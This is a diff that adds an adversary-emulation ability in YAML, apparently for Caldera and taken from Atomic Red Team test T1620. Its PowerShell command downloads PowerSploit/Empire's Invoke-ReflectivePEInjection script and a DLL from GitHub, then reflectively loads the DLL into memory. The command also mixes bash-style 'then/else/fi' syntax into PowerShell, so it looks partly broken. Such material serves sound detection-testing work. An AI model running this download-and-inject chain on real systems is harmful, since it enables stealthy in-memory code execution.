@@ -1,0 +1,97 @@
+- id: 114c2b95-d992-4c03-8c38-fc58420a3eb5
+  name: Reflective PE Injection via PowerSploit
+  description: 'Uses PowerSploit''s Invoke-ReflectivePEInjection to reflectively load
+    a PE file into the
+
+    current PowerShell process.
+
+
+    Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1'
+  tactic: stealth
+  technique:
+    attack_id: T1620
+    name: Reflective Code Loading
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-ReflectivePEInjection.ps1")
+          { exit 0 } else { exit 1 }; then : ; else New-Item -Type Directory (Split-Path
+          "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-ReflectivePEInjection.ps1")
+          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/dev/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-ReflectivePEInjection.ps1";
+          fi; if (Test-Path "PathToAtomicsFolder\T1620\bin\reflective_load.dll") {
+          exit 0 } else { exit 1 }; then : ; else Remove-Item -Path "$env:TEMP\T1620_pe_downloaded"
+          -Force -ErrorAction SilentlyContinue; New-Item -Type Directory (Split-Path
+          "PathToAtomicsFolder\T1620\bin\reflective_load.dll") -ErrorAction Ignore
+          -Force | Out-Null; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1620/bin/reflective_load.dll"
+          -OutFile "PathToAtomicsFolder\T1620\bin\reflective_load.dll"; New-Item -Type
+          File "$env:TEMP\T1620_pe_downloaded" -Force | Out-Null; fi; Import-Module
+          "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-ReflectivePEInjection.ps1";
+          Invoke-ReflectivePEInjection -PEPath "PathToAtomicsFolder\T1620\bin\reflective_load.dll"
+          -ExeArgs "#{exe_args}"'
+        cleanup: Remove-Item "#{script_path}" -Force -ErrorAction SilentlyContinue;
+          if (Test-Path "$env:TEMP\T1620_pe_downloaded") {; Remove-Item "#{pe_path}"
+          -Force -ErrorAction SilentlyContinue; Remove-Item "$env:TEMP\T1620_pe_downloaded"
+          -Force; }
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1620
+  - atomic-red-team
+  - stealth
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      script_url:
+        description: URL to download Invoke-ReflectivePEInjection.ps1
+        type: url
+        default: https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/dev/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1
+      script_path:
+        description: Local path to save Invoke-ReflectivePEInjection.ps1
+        type: path
+        default: PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-ReflectivePEInjection.ps1
+      pe_path:
+        description: Path to the PE file to reflectively load
+        type: path
+        default: PathToAtomicsFolder\T1620\bin\reflective_load.dll
+      pe_url:
+        description: URL to download PE file from if not available locally
+        type: url
+        default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1620/bin/reflective_load.dll
+      exe_args:
+        description: Arguments passed to the reflectively loaded executable
+        type: string
+        default: null
+    dependencies:
+    - description: Invoke-ReflectivePEInjection.ps1 must be on disk
+      prereq_command: 'if (Test-Path "#{script_path}") { exit 0 } else { exit 1 }
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (Split-Path "#{script_path}")
+        -ErrorAction Ignore -Force | Out-Null
+
+        Invoke-WebRequest -Uri "#{script_url}" -OutFile "#{script_path}"
+
+        '
+    - description: PE file must be on disk
+      prereq_command: 'if (Test-Path "#{pe_path}") { exit 0 } else { exit 1 }
+
+        '
+      get_prereq_command: 'Remove-Item -Path "$env:TEMP\T1620_pe_downloaded" -Force
+        -ErrorAction SilentlyContinue
+
+        New-Item -Type Directory (Split-Path "#{pe_path}") -ErrorAction Ignore -Force
+        | Out-Null
+
+        Invoke-WebRequest -Uri "#{pe_url}" -OutFile "#{pe_path}"
+
+        New-Item -Type File "$env:TEMP\T1620_pe_downloaded" -Force | Out-Null
+
+        '
+    technique_created: '2021-10-05T01:15:06.293Z'
+    atomic_guid: 114c2b95-d992-4c03-8c38-fc58420a3eb5
+    import_timestamp: '2026-09-05T06:41:04.006219Z'
